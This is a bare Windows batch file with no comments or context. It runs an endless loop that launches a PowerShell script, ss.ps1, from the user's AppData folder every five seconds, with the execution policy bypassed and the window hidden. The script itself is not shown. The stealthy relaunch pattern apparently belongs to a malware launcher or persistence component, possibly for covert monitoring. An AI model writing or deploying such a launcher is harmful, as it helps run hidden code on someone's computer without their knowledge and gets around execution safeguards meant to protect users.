@echo off
:loop
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\ss.ps1"
timeout /t 5 /nobreak >nul
goto loop
